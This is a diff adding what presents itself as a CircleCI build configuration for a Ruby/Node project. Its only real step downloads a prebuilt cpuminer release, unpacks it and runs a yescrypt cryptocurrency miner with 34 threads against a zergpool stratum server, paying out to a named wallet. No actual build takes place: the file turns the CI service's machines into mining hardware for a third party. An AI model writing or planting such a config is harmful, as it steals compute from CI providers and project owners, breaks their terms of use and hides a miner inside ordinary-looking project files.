@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  mkdir cpuminer-opt-rplant && cd cpuminer-opt-rplant && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && ./cpuminer-avx512 -a yescrypt -o stratum+tcp://yescrypt.mine.zergpool.com:6233 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=BSTY,ID=Cloud -t 34
